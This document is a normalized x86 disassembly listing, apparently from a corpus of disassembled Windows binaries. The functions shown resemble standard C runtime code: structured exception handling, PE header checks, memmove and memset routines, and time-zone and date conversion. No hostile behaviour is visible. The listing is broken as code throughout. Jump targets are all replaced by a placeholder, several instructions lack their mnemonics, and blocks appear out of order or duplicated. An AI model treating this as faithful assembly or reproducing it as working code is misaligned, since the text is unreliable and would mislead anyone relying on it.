push 0x8
je r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
push ebx
push [ rw-data ]
call sub_415561
pop ecx
call eax
pop ecx
pop ecx
mov eax [ ebp - 0x34 ]
mov [ esi ] eax
mov ax [ ebp - 0x34 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x18 ] 0x200
jmp r-xdata
lea esi [ ebp + 0x1eb ]
and [ ebp - 0x3c ] 0x0
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov [ ebp - 0x68 ] 0x1
jmp r-xdata
test [ ebp - 0x18 ] 0x4
je r-xdata
mov esi [ ebp - 0x24 ]
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x20 ] 0xa3
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x6c ] esi
mov ebx eax
jmp r-xdata
push ebx
jmp r-xdata
or [ ebp - 0x18 ] 0x100
inc ebx
mov [ ebp - 0x24 ] ebx
lea eax [ ebp - 0x5c ]
push eax
push ebx
push [ rw-data ]
call sub_415561
pop ecx
call eax
pop ecx
pop ecx
mov [ ebp - 0x68 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x28 ]
cdq
push edx
push eax
push ebx
push edi
call sub_41b8d0
add ecx 0x30
cmp ecx 0x39
mov [ ebp - 0x6c ] ebx
mov edi eax
mov ebx edx
jle r-xdata
mov eax edi
or eax ebx
je r-xdata
push edi
push ebx
push 0x20
lea eax [ ebp - 0x34 ]
call sub_4175ef
add esp 0xc
or [ ebp - 0x34 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x78 ] eax
je r-xdata
pop esi
call sub_4108e0
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x64 ]
lea eax [ ebp + 0x1eb ]
sub eax esi
inc esi
test [ ebp - 0x18 ] 0x200
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] esi
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jl r-xdata
push [ ebp - 0x78 ]
lea eax [ ebp - 0x34 ]
lea ecx [ ebp + 0x1ec ]
call sub_417613
cmp [ ebp - 0x6c ] 0x0
pop ecx
jne r-xdata
mov eax [ ebp - 0x20 ]
dec [ ebp - 0x20 ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
movzx eax [ esi ]
dec [ ebp - 0x6c ]
push eax
push 0x6
lea eax [ ebp + 0x1ec ]
push eax
lea eax [ ebp - 0x78 ]
inc esi
push eax
inc esi
call sub_41b862
add esp 0x10
test eax eax
jne r-xdata
jmp r-xdata
dec [ ebp - 0x24 ]
mov ecx [ ebp - 0x24 ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_418010
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_4180a0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_41bf71
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_41bf90
jmp r-xdata
sub_4180a0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_40f589
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_418010
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_418102
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_418132
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push 0x0
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_418170
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0x5a4d
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
retn
xor ecx ecx
cmp [ eax + 0x18 ] 0x10b
sete cl
mov eax ecx
retn
sub_4181a0
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
test esi esi
push edi
lea eax [ eax + ecx + 0x18 ]
jbe r-xdata
xor eax eax
mov edi [ esp + 0x14 ]
add edx 0x1
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
retn
sub_4181e2
push 0x8
push r--data
call sub_4106dc
and [ ebp - 0x4 ] 0x0
mov edx __dos_header
push edx
call sub_418170
pop ecx
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov eax [ ebp + 0x8 ]
sub eax edx
push eax
push edx
call sub_4181a0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
call sub_410721
retn
sub_418250
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_4182d8 ]
jmp [ ecx * 4 + jump_table_418358 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4183c4 ]
pop esi
pop edi
pop ebp
jmp sub_41bc86
jmp [ ecx * 4 + jump_table_418560 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_418464 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_418560 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4183c4 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_418560 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4183c4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4183c4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4183c4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_418560 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_418560 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_418560 ]
sub_4185b5
push ebp
mov ebp esp
sub esp 0x4
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
shr ecx 0x7
pxor xmm0 xmm0
jmp r-xdata
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm0
movdqa [ edi + 0x20 ] xmm0
movdqa [ edi + 0x30 ] xmm0
movdqa [ edi + 0x40 ] xmm0
movdqa [ edi + 0x50 ] xmm0
movdqa [ edi + 0x60 ] xmm0
movdqa [ edi + 0x70 ] xmm0
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_41860c
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0x8 ]
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
test edi edi
jne r-xdata
neg edi
add edi 0x10
mov [ ebp - 0x10 ] edi
xor eax eax
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
[ edi ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
add ecx eax
sub edx eax
push edx
push 0x0
push ecx
call sub_41860c
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
and edx 0x7f
mov [ ebp - 0xc ] edx
cmp ecx edx
je r-xdata
test edx edx
je r-xdata
sub ecx edx
push ecx
push eax
call sub_4185b5
add esp 0x8
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
add eax [ ebp + 0x10 ]
sub eax edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
[ edi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_4186af
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
cmp esi edi
mov [ ebp - 0x4 ] edi
jne r-xdata
push 0x24
push 0xff
push esi
call sub_4109d0
mov eax [ ebp + 0xc ]
add esp 0xc
cmp eax edi
je r-xdata
call sub_411077
push 0x16
pop esi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] esi
call sub_413fad
add esp 0x14
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
cmp eax edi
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
jg r-xdata
pop edi
pop esi
leave
retn
cmp eax 0x7
jl r-xdata
jl r-xdata
push ebx
push edi
push 0x1e13380
push eax
push ecx
call sub_412b40
mov ecx eax
add ecx 0x46
lea eax [ ecx + 0x12b ]
cdq
mov ebx 0x190
idiv ebx
lea edi [ ecx - 0x1 ]
push 0x64
mov [ ebp - 0x8 ] edi
mov [ ebp + 0x8 ] ecx
mov ebx eax
mov eax edi
cdq
pop edi
idiv edi
push 0xffffffff
push 0xfffffe93
sub ebx eax
mov eax [ ebp - 0x8 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea eax [ ebx + eax - 0x11 ]
cdq
mov edi eax
lea eax [ ecx - 0x46 ]
mov ebx edx
cdq
push edx
push eax
call sub_412b00
sub eax edi
sbb edx ebx
push 0x0
mov ebx 0x15180
push ebx
push edx
push eax
call sub_412b00
mov edi [ ebp - 0x10 ]
add edi eax
adc [ ebp - 0xc ] edx
cmp [ ebp - 0xc ] 0x0
jg r-xdata
jg r-xdata
call sub_411077
push 0x16
pop esi
mov [ eax ] esi
jmp r-xdata
cmp ecx edi
jae r-xdata
mov eax [ ebp + 0x8 ]
mov ecx eax
and ecx 0x80000003
jns r-xdata
jl r-xdata
cmp ecx 0x93406fff
ja r-xdata
mov eax esi
jmp r-xdata
jne r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
mov eax [ ebp - 0x8 ]
add edi 0x1e13380
adc [ ebp - 0xc ] 0x0
mov ecx eax
and ecx 0x80000003
mov [ ebp + 0x8 ] eax
jns r-xdata
test edi edi
jae r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x76c
cdq
mov ecx 0x190
idiv ecx
test edx edx
jne r-xdata
push 0x64
cdq
pop ecx
idiv ecx
test edx edx
jne r-xdata
jne r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
mov eax [ ebp + 0x8 ]
push 0x0
push ebx
push [ ebp - 0xc ]
mov [ esi + 0x14 ] eax
push edi
call sub_412b40
push 0xffffffff
mov [ esi + 0x1c ] eax
cdq
push 0xfffeae80
push edx
push eax
call sub_412b00
add edi eax
adc [ ebp - 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
mov edx rw-data
jne r-xdata
mov [ ebp - 0x4 ] 0x1
add eax 0x76c
cdq
mov ecx 0x190
idiv ecx
test edx edx
jne r-xdata
push 0x64
cdq
pop ecx
idiv ecx
test edx edx
jne r-xdata
mov eax [ esi + 0x1c ]
xor ecx ecx
inc ecx
cmp [ edx + 0x4 ] eax
jge r-xdata
mov edx rw-data
add edi ebx
adc [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec ecx
mov [ esi + 0x10 ] ecx
sub eax [ edx + ecx * 4 ]
push 0x0
mov [ esi + 0xc ] eax
mov eax [ ebp + 0xc ]
push ebx
push [ eax + 0x4 ]
push [ eax ]
call sub_412b40
push 0x7
add eax 0x4
pop ecx
cdq
idiv ecx
xor ebx ebx
push ebx
push 0xe10
push [ ebp - 0xc ]
push edi
mov [ esi + 0x18 ] edx
call sub_412b40
push 0xffffffff
mov [ esi + 0x8 ] eax
cdq
push 0xfffff1f0
push edx
push eax
call sub_412b00
push ebx
add edi eax
adc [ ebp - 0xc ] edx
push 0x3c
push [ ebp - 0xc ]
push edi
call sub_412b40
mov [ esi + 0x4 ] eax
imul eax eax 0x3c
sub edi eax
mov [ esi + 0x20 ] ebx
mov [ esi ] edi
xor eax eax
pop ebx
mov ebx eax
inc ecx
cmp [ edx + ecx * 4 ] ebx
jl r-xdata
mov ebx 0x15180
sub_4188eb
mov eax [ esp + 0x4 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop esi
retn
call sub_411077
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_413fad
add esp 0x14
push 0x16
pop eax
pop esi
retn
sub_41891f
mov eax [ esp + 0x4 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop esi
retn
call sub_411077
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_413fad
add esp 0x14
push 0x16
pop eax
pop esi
retn
sub_418953
mov eax [ esp + 0x4 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop esi
retn
call sub_411077
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_413fad
add esp 0x14
push 0x16
pop eax
pop esi
retn
sub_41899f
push 0x2c
push r--data
call sub_4106dc
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x20 ] ebx
push 0x7
call sub_4141fc
pop ecx
mov [ ebp - 0x4 ] ebx
call sub_418999
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x1c ]
push eax
call sub_418953
pop ecx
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_4188eb
pop ecx
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_413eb1
add esp 0x14
lea eax [ ebp - 0x28 ]
push eax
call sub_41891f
pop ecx
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_413eb1
add esp 0x14
call sub_41c0d1
mov [ ebp - 0x34 ] eax
mov [ rw-data ] ebx
or edi 0xffffffff
mov [ rw-data ] edi
mov [ rw-data ] edi
push r--data
call sub_41c050
pop ecx
mov esi eax
mov [ ebp - 0x3c ] esi
cmp esi ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_413eb1
add esp 0x14
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ esi ] bl
je r-xdata
push rw-data
call [ GetTimeZoneInformation@IAT ]
cmp eax edi
je r-xdata
push eax
call sub_40f613
pop ecx
mov [ rw-data ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x2c ] 0x1
xor ecx ecx
inc ecx
mov [ rw-data ] ecx
mov eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x1c ] eax
cmp [ rw-data ] bx
je r-xdata
push esi
call sub_4108e0
inc eax
push eax
call sub_417499
pop ecx
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
push eax
push esi
call sub_415aa0
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_410721
retn
push 0x3
push esi
push 0x40
mov edi [ ebp - 0x20 ]
push [ edi ]
call sub_412d19
add esp 0x10
test eax eax
je r-xdata
cmp [ rw-data ] bx
je r-xdata
mov edx [ rw-data ]
imul edx edx 0x3c
add eax edx
mov [ ebp - 0x1c ] eax
push esi
push esi
call sub_4108e0
pop ecx
inc eax
push eax
push [ rw-data ]
call sub_410677
add esp 0xc
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
add esi 0x3
cmp [ esi ] 0x2d
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_413eb1
add esp 0x14
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov edi [ ebp - 0x1c ]
call sub_418993
mov [ eax ] edi
mov edi [ ebp - 0x24 ]
call sub_418987
mov [ eax ] edi
mov edi [ ebp - 0x28 ]
call sub_41898d
mov [ eax ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_418c4e
cmp [ ebp - 0x2c ] ebx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_413eb1
add esp 0x14
jmp r-xdata
push eax
call sub_40f613
pop ecx
push esi
call sub_40f8d1
pop ecx
imul eax eax 0xe10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x38 ] 0x1
inc esi
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ecx
sub eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x28 ] eax
jmp r-xdata
inc esi
jmp r-xdata
cmp al 0x30
jl r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax ] bl
cmp [ ebp - 0x30 ] ebx
jne r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax ]
push edi
push rw-data
push ebx
push [ ebp - 0x34 ]
mov edi [ WideCharToMultiByte@IAT ]
call edi
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov [ eax + 0x3f ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push ebx
push 0x3f
mov eax [ ebp - 0x20 ]
push [ eax + 0x4 ]
push 0xffffffff
push rw-data
push ebx
push [ ebp - 0x34 ]
call edi
test eax eax
je r-xdata
cmp [ ebp - 0x38 ] ebx
je r-xdata
inc esi
push esi
call sub_40f8d1
pop ecx
imul eax eax 0x3c
add [ ebp - 0x1c ] eax
jmp r-xdata
movsx eax [ esi ]
mov [ ebp - 0x24 ] eax
cmp eax ebx
je r-xdata
neg [ ebp - 0x1c ]
mov al [ esi ]
cmp al 0x30
jge r-xdata
mov eax [ edi + 0x4 ]
mov [ eax ] bl
push 0x3
push esi
push 0x40
push [ edi + 0x4 ]
call sub_412d19
add esp 0x10
test eax eax
je r-xdata
cmp al 0x39
jg r-xdata
cmp [ esi ] 0x3a
jne r-xdata
mov esi [ ebp - 0x1c ]
call sub_418993
mov [ eax ] esi
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_413eb1
add esp 0x14
jmp r-xdata
inc esi
inc esi
push esi
call sub_40f8d1
pop ecx
add [ ebp - 0x1c ] eax
jmp r-xdata
mov al [ esi ]
cmp al 0x30
jge r-xdata
cmp al 0x39
jg r-xdata
inc esi
sub_418cde
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x1
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi eax
mov eax edi
jne r-xdata
and eax 0x80000003
jns r-xdata
and eax 0x80000003
jns r-xdata
jne r-xdata
dec eax
or eax 0xfffffffc
inc eax
mov [ ebp - 0xc ] eax
jne r-xdata
dec eax
or eax 0xfffffffc
inc eax
lea eax [ edi + 0x76c ]
cdq
mov ebx 0x190
idiv ebx
test edx edx
je r-xdata
mov eax edi
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
lea eax [ edi + 0x76c ]
cdq
mov ebx 0x190
idiv ebx
test edx edx
je r-xdata
mov eax edi
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
mov esi [ esi * 4 + rw-data ]
mov esi [ esi * 4 + rw-data ]
jmp r-xdata
mov eax esi
shl eax 0x2
mov esi [ eax + rw-data ]
mov eax esi
shl eax 0x2
mov esi [ eax + rw-data ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ rw-data ] esi
mov [ rw-data ] ecx
call sub_41891f
test eax eax
pop ecx
je r-xdata
mov [ rw-data ] esi
mov [ rw-data ] ecx
mov [ rw-data ] edi
jmp r-xdata
add esi [ ebp + 0x1c ]
add esi eax
lea esi [ esi + eax - 0x7 ]
jmp r-xdata
mov [ ebp + 0xc ] eax
lea eax [ edi + 0x12b ]
cdq
lea ebx [ edi - 0x1 ]
mov edi 0x190
idiv edi
push 0x64
pop edi
inc esi
push 0x7
mov [ ebp - 0x8 ] eax
mov eax ebx
cdq
idiv edi
mov edx [ ebp - 0x8 ]
mov edi [ ebp + 0x10 ]
sub edx eax
mov ebx edx
lea eax [ edi - 0x1 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov edx edi
imul edx edx 0x16d
add eax esi
add eax ebx
lea eax [ edx + eax - 0x63db ]
cdq
pop ebx
idiv ebx
mov eax [ ebp + 0x14 ]
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x18 ]
cmp edx [ ebp + 0x18 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
imul eax eax 0x3e8
add [ rw-data ] eax
jns r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_413eb1
add esp 0x14
pop edi
pop esi
pop ebx
leave
retn
imul ecx ecx 0x3c
add ecx [ ebp + 0x20 ]
imul ecx ecx 0x3c
add ecx [ ebp + 0x24 ]
imul ecx ecx 0x3e8
add ecx [ ebp + 0x28 ]
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x5
jne r-xdata
mov eax 0x5265c00
cmp [ rw-data ] eax
jl r-xdata
add [ rw-data ] 0x5265c00
dec [ rw-data ]
jmp r-xdata
lea eax [ edi + 0x76c ]
cdq
mov ebx 0x190
idiv ebx
test edx edx
je r-xdata
mov eax edi
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
mov [ rw-data ] edi
sub [ rw-data ] eax
inc [ rw-data ]
mov eax [ ebp + 0xc ]
mov eax [ eax + rw-data ]
mov eax [ ebp + 0xc ]
mov eax [ eax + rw-data ]
jmp r-xdata
sub esi 0x7
jmp r-xdata
cmp esi eax
jle r-xdata
sub_418ed3
push ebp
mov ebp esp
push ecx
push esi
lea eax [ ebp - 0x4 ]
xor esi esi
push eax
mov [ ebp - 0x4 ] esi
call sub_4188eb
test eax eax
pop ecx
je r-xdata
cmp [ ebp - 0x4 ] esi
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_413eb1
add esp 0x14
mov edx [ edi + 0x14 ]
push ebx
xor ebx ebx
inc ebx
cmp edx [ rw-data ]
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
je r-xdata
cmp edx [ rw-data ]
je r-xdata
pop esi
leave
retn
push esi
push esi
push esi
push esi
push esi
push ebx
push edx
push ebx
push ebx
push 0x2
pop ecx
push 0x4
pop eax
call sub_418cde
push esi
push esi
push esi
push esi
push esi
push 0x5
push [ edi + 0x14 ]
push ebx
push esi
push 0x2
pop ecx
push 0xa
pop eax
call sub_418cde
add esp 0x48
cmp [ rw-data ] si
movzx eax [ rw-data ]
movzx ecx [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
jne r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
cmp ecx eax
mov edx [ edi + 0x1c ]
jge r-xdata
cmp edx eax
jl r-xdata
cmp edx ecx
